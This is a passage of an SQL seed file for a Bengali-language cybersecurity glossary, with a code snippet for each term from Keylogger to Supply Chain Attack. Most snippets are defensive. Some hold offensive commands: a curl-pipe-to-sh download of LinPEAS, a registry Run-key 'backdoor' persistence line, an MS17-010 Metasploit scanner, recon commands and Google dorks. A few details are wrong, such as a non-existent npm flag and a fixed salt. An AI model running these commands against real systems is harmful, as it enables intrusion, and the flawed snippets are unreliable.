    if (!token) return res.status(401).json({ error: 'No token' });
    try {
        req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch {
        res.status(401).json({ error: 'Invalid token' });
    }
};

// NEVER store JWT in localStorage — use httpOnly cookie$X023X$,
  ARRAY['token','stateless','API','OAuth','Bearer'],
  'medium', 'Identity', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'K', 'Keylogger', 'কীবোর্ডের প্রতিটি চাপ রেকর্ড করা',
  '👀 কেউ পেছন থেকে তুমি কী টাইপ করছ সব দেখছে ও লিখে রাখছে।',
  'Keylogger হলো software বা hardware যা keyboard-এর প্রতিটি keystroke রেকর্ড করে। পাসওয়ার্ড, credit card সব capture হয়।',
  'Credential theft, corporate espionage।',
  'Phishing email attachment খুলতেই keylogger install হয়ে সব পাসওয়ার্ড চলে যাচ্ছে।',
  $X024X$# Keylogger Detection
import subprocess

def check_suspicious():
    indicators = ['ardamax','refog','spyrix','revealer']
    result = subprocess.run(['tasklist','/FO','CSV'],
                           capture_output=True, text=True)
    for line in result.stdout.lower().split('\n'):
        for ind in indicators:
            if ind in line:
                print(f'Potential keylogger: {line.strip()}')

# Prevention:
# Use virtual keyboard for banking sites
# Enable 2FA (keylogger gets password but not OTP)
# Regular antivirus scan
check_suspicious()$X024X$,
  ARRAY['spyware','surveillance','credential','hardware'],
  'high', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'L', 'Lateral Movement', 'নেটওয়ার্কে ছড়িয়ে পড়া',
  '🐍 একটি ঘরে ঢুকে ধীরে ধীরে পুরো বাড়িতে ছড়িয়ে পড়া।',
  'Lateral Movement হলো attacker একটি system compromise করার পরে network-এ অন্য systems-এ ছড়িয়ে পড়ার technique।',
  'APT attacks-এ initial access থেকে domain controller পৌঁছানো।',
  'NotPetya ransomware EternalBlue দিয়ে পুরো network-এ ছড়িয়ে পড়েছিল।',
  $X025X$# Lateral Movement Detection
import subprocess

def detect_suspicious_logins():
    # Check Windows Event Log for suspicious logon types
    suspicious_events = {
        4624: 'Successful Logon',
        4648: 'Explicit Credential Logon',  # PtH indicator
        4672: 'Admin Logon',
    }
    for event_id, desc in suspicious_events.items():
        cmd = f'wevtutil qe Security /q:"*[System[EventID={event_id}]]" /c:5'
        result = subprocess.run(cmd, capture_output=True,
                                text=True, shell=True)
        if result.stdout:
            print(f'Event {event_id} ({desc}): found')

# Defense: Network segmentation, Zero Trust$X025X$,
  ARRAY['pivot','Pass-the-Hash','PsExec','network','APT'],
  'critical', 'Attack Vector', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'L', 'SIEM (Log Management)', 'নিরাপত্তা লগ সংগ্রহ ও বিশ্লেষণ',
  '📹 সিসিটিভি ফুটেজ — সব ঘটনা রেকর্ড, পরে বিশ্লেষণ।',
  'SIEM (Security Information and Event Management) হলো বিভিন্ন source থেকে security log সংগ্রহ করে real-time analysis করার platform।',
  'Compliance, incident detection, forensic investigation।',
  'Splunk SIEM ব্যবহার করে Bank of America প্রতিদিন 300 billion event analyze করে।',
  $X026X$# ELK Stack Brute Force Detection
from elasticsearch import Elasticsearch

es = Elasticsearch(['http://localhost:9200'])

def detect_brute_force(threshold=10, window='5m'):
    query = {
        'query': {
            'bool': {
                'must': [
                    {'match': {'event.action': 'failed_login'}},
                    {'range': {'@timestamp': {'gte': f'now-{window}', 'lt': 'now'}}}
                ]
            }
        },
        'aggs': {
            'by_ip': {'terms': {'field': 'source.ip', 'min_doc_count': threshold}}
        }
    }
    result = es.search(index='logs-*', body=query)
    for b in result['aggregations']['by_ip']['buckets']:
        print(f'Brute force from {b["key"]}: {b["doc_count"]} attempts')$X026X$,
  ARRAY['Splunk','ELK','logging','monitoring','compliance'],
  'medium', 'Defense', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'M', 'MFA (Multi-Factor Authentication)', 'বহু স্তরের পরিচয় যাচাই',
  '🏦 ব্যাংকের লকার — চাবি + পাসওয়ার্ড + আঙুলের ছাপ তিনটাই লাগে।',
  'MFA হলো দুই বা ততোধিক authentication factor-এর combination। Hardware key (YubiKey), biometric, push notification।',
  'Financial systems, healthcare, government।',
  'Microsoft: MFA 99.9% automated attacks ব্লক করে।',
  $X027X$// WebAuthn / FIDO2 (Strongest MFA)
const { generateAuthenticationOptions } = require('@simplewebauthn/server');

async function startMFA(userId) {
    const user = await getUserById(userId);
    const options = await generateAuthenticationOptions({
        rpID: 'example.com',
        allowCredentials: user.keys.map(k => ({
            id: k.credentialID,
            type: 'public-key',
        })),
        userVerification: 'required',
    });
    await saveChallenge(userId, options.challenge);
    return options;
}

// Options: SMS OTP (weak), TOTP App (good),
//          Hardware Key (best), Biometric (best)$X027X$,
  ARRAY['FIDO2','WebAuthn','YubiKey','OTP','biometric'],
  'low', 'Defense', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'M', 'Malvertising', 'বিজ্ঞাপনের মাধ্যমে ম্যালওয়্যার',
  '📺 টিভি বিজ্ঞাপন দেখলেই বাড়িতে চোর ঢুকে যায়।',
  'Malvertising হলো online advertising network-এ malicious code inject করা — বৈধ সাইটের বিজ্ঞাপনেও malware থাকতে পারে।',
  'Drive-by download, ransomware distribution, cryptomining।',
  '2016 — NYTimes, BBC-র বিজ্ঞাপনে malvertising দিয়ে ransomware ছড়ানো।',
  $X028X$# Malvertising Prevention

# 1. Ad Blocker (best defense)
#    uBlock Origin — free, open source

# 2. DNS-level blocking with Pi-hole
docker run -d --name pihole \
  -p 53:53/tcp -p 53:53/udp -p 80:80 \
  -e TZ='Asia/Dhaka' \
  -e WEBPASSWORD='securepass' \
  pihole/pihole

# 3. Keep browser & plugins updated
# 4. Disable JavaScript where not needed (NoScript)
# 5. Use DNS-over-HTTPS: 1.1.1.1 or 8.8.8.8$X028X$,
  ARRAY['advertising','drive-by','browser','uBlock','DNS-blocking'],
  'high', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'N', 'Network Scanning', 'নেটওয়ার্ক রিকনেসাঁস',
  '🗺️ এলাকায় যাওয়ার আগে সব বাড়ির দরজা চেক করা।',
  'Network Scanning হলো active hosts, open ports ও services সনাক্ত করার প্রক্রিয়া। Penetration testing-এর প্রথম ধাপ।',
  'Vulnerability assessment, asset inventory।',
  'Nmap — সবচেয়ে জনপ্রিয় port scanner।',
  $X029X$# Nmap Cheatsheet
nmap 192.168.1.1              # Basic scan
nmap -sV -sC 192.168.1.1      # Service + scripts
nmap -p- 192.168.1.1          # All 65535 ports
nmap -A 192.168.1.1           # OS + service + scripts
nmap --script vuln 192.168.1.1 # Vuln scan

# Python Port Scanner
import socket

def scan(host, ports):
    open_ports = []
    for port in ports:
        s = socket.socket()
        s.settimeout(0.5)
        if s.connect_ex((host, port)) == 0:
            open_ports.append(port)
        s.close()
    return open_ports

print(scan('192.168.1.1', range(1, 1025)))$X029X$,
  ARRAY['Nmap','recon','port-scan','OSINT','pentest'],
  'medium', 'Reconnaissance', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'N', 'Network Segmentation', 'নেটওয়ার্ক বিভাজন',
  '🏠 বাড়িতে আলাদা কক্ষ — রান্নাঘরে আগুন লাগলে শোবার ঘর নিরাপদ।',
  'Network Segmentation হলো network-কে isolated VLAN-এ ভাগ করা — একটি অংশ compromise হলে বাকিতে ছড়াতে না পারে।',
  'PCI-DSS compliance, lateral movement প্রতিরোধ, IoT isolation।',
  'Target 2013 breach — HVAC vendor-এর credential দিয়ে payment network-এ ঢোকা।',
  $X030X$# AWS VPC Segmentation
aws ec2 create-vpc --cidr-block 10.0.0.0/16

# Public subnet (Load Balancer)
aws ec2 create-subnet --vpc-id vpc-xxx --cidr-block 10.0.1.0/24

# Private subnet (Application)
aws ec2 create-subnet --vpc-id vpc-xxx --cidr-block 10.0.2.0/24

# Isolated subnet (Database - no internet)
aws ec2 create-subnet --vpc-id vpc-xxx --cidr-block 10.0.3.0/24

# VLAN config (Cisco-style)
vlan 10
  name CORPORATE
vlan 20
  name GUESTS
vlan 30
  name IOT$X030X$,
  ARRAY['VLAN','AWS-VPC','lateral-movement','PCI-DSS','firewall'],
  'medium', 'Defense', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'O', 'OWASP Top 10', 'সবচেয়ে বিপজ্জনক ওয়েব নিরাপত্তা ঝুঁকি',
  '🏆 ওয়েব সিকিউরিটির Most Wanted তালিকা।',
  'OWASP Top 10 হলো সবচেয়ে গুরুতর ওয়েব vulnerability-র তালিকা, প্রতি 3-4 বছরে আপডেট।',
  'Secure development checklist, security audit baseline।',
  'OWASP 2021: A01-Broken Access Control, A02-Cryptographic Failures, A03-Injection।',
  $X031X$// OWASP Top 10 (2021)
const owasp = [
  { rank:'A01', name:'Broken Access Control',     fix:'RBAC, least privilege' },
  { rank:'A02', name:'Cryptographic Failures',    fix:'TLS 1.3, AES-256' },
  { rank:'A03', name:'Injection',                 fix:'Parameterized queries' },
  { rank:'A04', name:'Insecure Design',           fix:'Threat modeling' },
  { rank:'A05', name:'Security Misconfiguration', fix:'Hardening guides' },
  { rank:'A06', name:'Vulnerable Components',     fix:'SCA, patch regularly' },
  { rank:'A07', name:'Auth Failures',             fix:'MFA, strong passwords' },
  { rank:'A08', name:'Integrity Failures',        fix:'Code signing, SAST' },
  { rank:'A09', name:'Logging Failures',          fix:'SIEM, audit logs' },
  { rank:'A10', name:'SSRF',                      fix:'Allowlist, firewall' },
];$X031X$,
  ARRAY['web','standards','checklist','SAST','compliance'],
  'high', 'Web Security', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'O', 'OSINT', 'পাবলিক তথ্য থেকে গোয়েন্দাগিরি',
  '🔎 ইন্টারনেট সার্চ করে, সোশ্যাল মিডিয়া ঘেঁটে তোমার সব তথ্য বের করা।',
  'OSINT (Open Source Intelligence) হলো publicly available তথ্য থেকে intelligence সংগ্রহের কৌশল।',
  'Pentest recon, threat intelligence, journalism।',
  'Bellingcat OSINT দিয়ে MH17 shoot down-এ রাশিয়ান unit identify করেছিল।',
  $X032X$# OSINT Tools

# theHarvester — emails, subdomains
theHarvester -d target.com -b all -l 500

# Shodan — internet-connected devices
shodan search 'apache 2.4.49'  # vulnerable version

# DNS recon
whois target.com
dig target.com ANY
subfinder -d target.com

# Google Dorks
# site:target.com filetype:pdf
# site:target.com inurl:admin
# "target.com" "password" filetype:txt

# Python WHOIS
import whois
w = whois.whois('google.com')
print(w.emails, w.name_servers)$X032X$,
  ARRAY['reconnaissance','Shodan','Google-dorks','theHarvester','Maltego'],
  'medium', 'Reconnaissance', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'O', 'OAuth 2.0', 'তৃতীয় পক্ষের অনুমোদন প্রোটোকল',
  '🔑 হোটেলের master key ছাড়াই নিজের room key দিয়ে শুধু নিজের ঘর খোলা।',
  'OAuth 2.0 হলো authorization framework যা third-party app-কে user-এর পক্ষে limited access দেয় — পাসওয়ার্ড শেয়ার না করে।',
  'Social login, API authorization, third-party integrations।',
  'Google দিয়ে লগইন — তোমার Google password ছাড়াই app access পায়।',
  $X033X$// OAuth 2.0 Authorization Code Flow
const { Issuer, generators } = require('openid-client');

async function setupOAuth(app) {
    const issuer = await Issuer.discover('https://accounts.google.com');
    const client = new issuer.Client({
        client_id: process.env.GOOGLE_CLIENT_ID,
        client_secret: process.env.GOOGLE_CLIENT_SECRET,
        redirect_uris: ['http://localhost:3000/callback'],
    });
    app.get('/auth', (req, res) => {
        const state = generators.state();
        const url = client.authorizationUrl({
            scope: 'openid email profile', state
        });
        res.redirect(url);
    });
}$X033X$,
  ARRAY['authorization','OpenID','SSO','Google','social-login'],
  'medium', 'Identity', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'P', 'Password Manager', 'পাসওয়ার্ড নিরাপদে সংরক্ষণ',
  '🔐 সব চাবির একটা নিরাপদ বাক্স — একটাই master চাবি।',
  'Password Manager হলো software যা শত শত unique, strong password তৈরি ও encrypted vault-এ সংরক্ষণ করে।',
  'Personal ও corporate password management।',
  '1Password, Bitwarden, LastPass — জনপ্রিয় password managers।',
  $X034X$// Simple Password Vault (Concept)
const crypto = require('crypto');

class Vault {
    constructor(master) {
        this.key = crypto.scryptSync(master, 'salt', 32);
        this.data = {};
    }
    save(site, user, pass) {
        const iv = crypto.randomBytes(16);
        const c = crypto.createCipheriv('aes-256-gcm', this.key, iv);
        const enc = c.update(pass,'utf8','hex') + c.final('hex');
        this.data[site] = { user, enc, iv: iv.toString('hex'),
                           tag: c.getAuthTag().toString('hex') };
    }
    generate(len=20) {
        const chars = 'ABCDEFabcdef0123456789!@#$%';
        return Array.from(crypto.randomBytes(len))
            .map(b => chars[b % chars.length]).join('');
    }
}$X034X$,
  ARRAY['Bitwarden','1Password','vault','credentials','PBKDF2'],
  'low', 'Defense', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'P', 'Penetration Testing', 'অনুমোদিত হ্যাকিং পরীক্ষা',
  '🕵️ নিজের বাড়ির নিরাপত্তা পরীক্ষায় সাবেক চোরকে ভাড়া করা।',
  'Pentest হলো authorized simulated cyberattack। Black box (no info), White box (full info), Grey box (partial)।',
  'Security audit, compliance, pre-launch testing।',
  'HackerOne-এ ethical hackers Facebook-এর $500K+ bug bounty পেয়েছেন।',
  $X035X$# Pentest Methodology (PTES)

# Phase 1: Reconnaissance
nmap -sV -sC target.com
theHarvester -d target.com -b google

# Phase 2: Scanning
nmap -p- --min-rate 5000 target.com

# Phase 3: Exploitation
msfconsole
# search type:exploit

# Phase 4: Post Exploitation
# hashdump, mimikatz, local_exploit_suggester

# Phase 5: Reporting
# CVSS score for each finding
# Executive summary + Technical details
# Remediation roadmap$X035X$,
  ARRAY['ethical-hacking','Metasploit','Burp-Suite','PTES','OWASP'],
  'medium', 'Security Testing', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'P', 'PKI (Public Key Infrastructure)', 'পাবলিক কী অবকাঠামো',
  '📮 সবার public address জানা থাকে, private box শুধু নিজেই খুলতে পারে।',
  'PKI হলো digital certificate manage করার framework। Public key দিয়ে encrypt, private key দিয়ে decrypt।',
  'HTTPS, email signing, code signing, VPN।',
  'ব্যাংকের ওয়েবসাইটের lock icon মানে PKI-issued SSL certificate।',
  $X036X$# RSA Key Operations (Python)
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# Generate key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
public_key = private_key.public_key()

# Encrypt with public key
def rsa_encrypt(message, pub_key):
    return pub_key.encrypt(
        message.encode(),
        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                     algorithm=hashes.SHA256(), label=None)
    )

# Digital signature
def sign(message, priv_key):
    return priv_key.sign(message.encode(),
        padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())$X036X$,
  ARRAY['RSA','certificate','CA','SSL','digital-signature'],
  'medium', 'Cryptography', 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'P', 'Port Scanning', 'নেটওয়ার্ক পোর্ট অনুসন্ধান',
  '🚪 বড় ভবনের প্রতিটি দরজা কড়া নাড়া — কোনটা খোলা দেখা।',
  'Port Scanning হলো network host-এর কোন TCP/UDP port খোলা তা সনাক্ত করার technique। Open port = running service = potential entry point।',
  'Pentest recon, network audit, firewall testing।',
  'Nmap — সবচেয়ে জনপ্রিয় port scanner (Gordon Lyon তৈরি)।',
  $X037X$# Nmap Common Scans
nmap -sS host    # SYN stealth scan (default)
nmap -sU host    # UDP scan
nmap -sV host    # Service version
nmap -O host     # OS detection

# Common Ports Reference
# 21=FTP, 22=SSH, 23=Telnet, 25=SMTP
# 53=DNS, 80=HTTP, 443=HTTPS
# 3306=MySQL, 5432=PostgreSQL
# 3389=RDP, 6379=Redis, 27017=MongoDB

# Python Scanner
import socket
def scan(host, ports):
    return [p for p in ports
            if not socket.socket().connect_ex((host,p))]$X037X$,
  ARRAY['Nmap','reconnaissance','TCP','UDP','firewall'],
  'medium', 'Reconnaissance', 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'P', 'Privilege Escalation', 'সীমিত অ্যাক্সেস থেকে বেশি ক্ষমতা নেওয়া',
  '🪜 সাধারণ কর্মী সেজে ভেতরে ঢুকে CEO-র চেয়ারে বসা।',
  'Privilege Escalation হলো low permission থেকে high permission পাওয়ার প্রক্রিয়া। Vertical (user to root) ও Horizontal (user A to user B)।',
  'Post-exploitation, Linux/Windows privilege abuse।',
  'sudo vulnerability (CVE-2021-3156) — যেকোনো Linux user root হতে পারত।',
  $X038X$# Linux Privilege Escalation Checks

# SUID files (runs as root)
find / -perm -u=s -type f 2>/dev/null

# Sudo rights
sudo -l

# Cron jobs
cat /etc/crontab

# Kernel version
uname -a

# Auto-enumerate with LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Defense:
# Least privilege principle
# Regular patching
# sudo audit logging$X038X$,
  ARRAY['Linux','Windows','SUID','sudo','post-exploitation'],
  'critical', 'Attack Vector', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'R', 'Red Team vs Blue Team', 'আক্রমণ ও প্রতিরক্ষা দলের মহড়া',
  '⚔️🛡️ সেনাবাহিনীর যুদ্ধ মহড়া — একদল আক্রমণ করে, অন্যদল ঠেকায়।',
  'Red Team (attackers) ও Blue Team (defenders) organization-এর security effectiveness test করে। Purple Team দুটি একসাথে কাজ করে।',
  'Enterprise security maturity assessment, IR training।',
  'US military প্রথম Red Team concept Cold War-এ Soviet tactics simulate করতে ব্যবহার করে।',
  $X039X$# Red Team (MITRE ATT&CK)
nmap -sV -sC target_network
msfconsole
# use auxiliary/scanner/smb/smb_ms17_010

# Persistence
# reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor

# Blue Team Detection (Splunk)
# index=windows EventCode=4624 Logon_Type=10
# | stats count by src_ip, user
# | where count > 5

# Purple Team — both work together
# MITRE ATT&CK framework for TTPs
# Threat hunting with Sigma rules$X039X$,
  ARRAY['MITRE-ATTCK','purple-team','simulation','SOC','threat-hunting'],
  'medium', 'Security Testing', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'R', 'Reverse Engineering', 'সফটওয়্যারের ভেতরের কোড উন্মোচন',
  '🔧 একটি যন্ত্র খুলে দেখা কীভাবে কাজ করে।',
  'Reverse Engineering হলো compiled software বিশ্লেষণ করে source code বা algorithm বোঝার প্রক্রিয়া।',
  'Malware analysis, CTF, vulnerability research।',
  'WannaCry kill switch Marcus Hutchins reverse engineering করে খুঁজেছিলেন।',
  $X040X$# Static Analysis Tools

# Ghidra (NSA, Free)
ghidraRun  # Launch GUI

# objdump
objdump -d binary | head -50

# strings
strings binary | grep -E 'http|pass|key'

# Dynamic Analysis
gdb ./binary
# break main
# run
# info registers

# strace (system calls)
strace ./binary 2>&1 | grep -E 'open|connect'

# Python decompile
pip install uncompyle6
uncompyle6 compiled.pyc$X040X$,
  ARRAY['Ghidra','IDA-Pro','malware-analysis','CTF','disassembly'],
  'high', 'Security Testing', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'R', 'Rootkit', 'সিস্টেম লেভেলে লুকানো ম্যালওয়্যার',
  '🏗️ বাড়ির নিচে ফাউন্ডেশনে লুকানো — দেখতে পাচ্ছ না, কিন্তু নিয়ন্ত্রণ করছে।',
  'Rootkit হলো malware যা OS kernel level-এ লুকিয়ে থাকে — antivirus, process list থেকে নিজেকে hide করে।',
  'Long-term persistence, surveillance, data exfiltration।',
  'Sony BMG rootkit (2005) — CD কিনলেই computer-এ rootkit install হত।',
  $X041X$# Rootkit Detection

# chkrootkit
sudo apt install chkrootkit
sudo chkrootkit

# rkhunter
sudo rkhunter --update && sudo rkhunter --check

# Manual: compare /proc vs ps
import os, subprocess
proc_pids = {int(p) for p in os.listdir('/proc') if p.isdigit()}
ps_out = subprocess.run(['ps','-ax'], capture_output=True, text=True)
ps_pids = {int(l.split()[0]) for l in ps_out.stdout.split('\n')[1:] if l.strip()}
hidden = proc_pids - ps_pids
if hidden: print(f'Hidden processes: {hidden}')$X041X$,
  ARRAY['kernel','persistence','stealth','bootkit','UEFI'],
  'critical', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'S', 'SSRF', 'সার্ভারকে দিয়ে অভ্যন্তরীণ সার্ভিস এক্সেস',
  '🤝 অফিসের ভেতরের মানুষকে বলা — তুমি আমার হয়ে ওই ফাইলটা আনো।',
  'SSRF (Server-Side Request Forgery) — attacker server-কে internal network-এ request পাঠাতে বাধ্য করে, firewall bypass করে।',
  'Cloud metadata চুরি, internal service access।',
  'Capital One breach — SSRF দিয়ে AWS metadata থেকে credentials চুরি।',
  $X042X$// SSRF Prevention (Node.js)
async function isSafeUrl(url) {
    const parsed = new URL(url);
    const { resolve4 } = require('dns').promises;
    const addrs = await resolve4(parsed.hostname);
    const privateRanges = [
        /^127\./, /^10\./, /^192\.168\./,
        /^172\.(1[6-9]|2\d|3[01])\./,
        /^169\.254\./
    ];
    for (const addr of addrs) {
        if (privateRanges.some(r => r.test(addr)))
            throw new Error(`Blocked private IP: ${addr}`);
    }
    const allowed = ['api.trusted.com'];
    if (!allowed.includes(parsed.hostname))
        throw new Error('Domain not allowlisted');
    return true;
}$X042X$,
  ARRAY['OWASP','cloud','AWS','metadata','internal-network'],
  'critical', 'Web Security', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'S', 'Secure Coding', 'নিরাপদ কোড লেখার নীতিমালা',
  '🏗️ বাড়ি বানানোর সময় ভূমিকম্প প্রতিরোধী করা — পরে ঠিক করার চেয়ে শুরুতেই নিরাপদ।',
  'Secure Coding হলো development-এ vulnerability প্রতিরোধ করার practices। Input validation, output encoding, error handling।',
  'Web app, mobile app, API — সব জায়গায়।',
  'Microsoft SDL দিয়ে Windows-এর vulnerability 91% কমেছে।',
  $X043X$// Secure Coding Checklist
const helmet = require('helmet');
const { body, validationResult } = require('express-validator');

// 1. Security headers
app.use(helmet());

// 2. Input validation
app.post('/user', [
    body('email').isEmail().normalizeEmail(),
    body('name').trim().escape().isLength({min:1, max:50}),
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty())
        return res.status(400).json({ errors: errors.array() });
});

// 3. No secrets in code
const apiKey = process.env.API_KEY;

// 4. Safe error messages
app.use((err, req, res, next) => {
    console.error(err);  // server log
    res.status(500).json({ error: 'Internal error' }); // user
});$X043X$,
  ARRAY['SAST','DAST','SDL','input-validation','Helmet'],
  'medium', 'Defense', 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'S', 'Session Hijacking', 'লগইন সেশন চুরি করা',
  '🪪 কেউ তোমার ID card চুরি করে তোমার পরিচয়ে কাজ করছে।',
  'Session Hijacking হলো valid user-এর session token চুরি করে তার পরিচয়ে access করা।',
  'E-commerce, banking, social media session abuse।',
  'Public WiFi HTTP-তে session cookie sniff করে hijack সম্ভব।',
  $X044X$// Session Security (Express)
const session = require('express-session');

app.use(session({
    secret: process.env.SESSION_SECRET,
    name: '__Host-sid',       // Rename from default
    cookie: {
        httpOnly: true,       // No JS access
        secure: true,         // HTTPS only
        sameSite: 'strict',   // CSRF protection
        maxAge: 30 * 60 * 1000  // 30 min
    },
    resave: false,
    saveUninitialized: false,
}));

// Regenerate on login (prevent fixation)
app.post('/login', async (req, res) => {
    req.session.regenerate((err) => {
        req.session.userId = user.id;
        res.json({ success: true });
    });
});$X044X$,
  ARRAY['cookies','HTTPS','XSS','session-fixation','Redis'],
  'high', 'Web Security', 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'S', 'Spyware', 'গোপনে তথ্য সংগ্রহকারী সফটওয়্যার',
  '🕵️ অজান্তে পিছু নেওয়ার মতো — সব দেখছে, তুমি জানো না।',
  'Spyware হলো malware যা user-এর অজান্তে তথ্য সংগ্রহ করে — browser history, keystrokes, camera/mic access।',
  'Stalkerware, corporate espionage, government surveillance।',
  'Pegasus spyware — iPhone zero-click exploit দিয়ে journalists monitor।',
  $X045X$# Spyware Detection
import psutil

def check_privacy():
    risky = []
    for proc in psutil.process_iter(['name','pid','connections']):
        try:
            for conn in (proc.info['connections'] or []):
                if (conn.status == 'ESTABLISHED' and conn.raddr
                        and conn.raddr.port in [4444,1337,31337]):
                    risky.append(proc.info['name'])
        except: pass
    return risky

# Prevention:
# Check app permissions (camera/mic)
# Physical camera cover
# Regular security scan
print('Risky processes:', check_privacy())$X045X$,
  ARRAY['surveillance','Pegasus','stalkerware','privacy','camera'],
  'critical', 'Malware', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES (
  'S', 'Supply Chain Attack', 'সাপ্লাই চেইনে আক্রমণ',
  '🏭 খাবারের কারখানায় বিষ মেশানো — সব দোকানে পৌঁছে যায়।',
  'Supply Chain Attack হলো software বা hardware-এর development বা distribution-এ malicious code inject করা।',
  'Software update mechanism, third-party libraries।',
  'SolarWinds (2020) — Orion update-এ backdoor, 18,000+ organization affected।',
  $X046X$# Supply Chain Security

# npm audit
npm audit
npm audit fix
npm ci  # exact install from lockfile

# Verify package integrity
npm install --require-hashes

# GitHub Actions: pin to commit hash
# uses: actions/checkout@a12a3943b4bd  (safe)
# NOT: uses: actions/checkout@v3      (risky)

# SBOM generation
syft packages dir:. -o spdx-json > sbom.json
grype sbom:sbom.json  # scan for vulns$X046X$,
  ARRAY['SolarWinds','npm','dependency','SBOM','third-party'],
  'critical', 'Threat Actor', 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'
) ON CONFLICT (term) DO NOTHING;
INSERT INTO public.cyber_terms
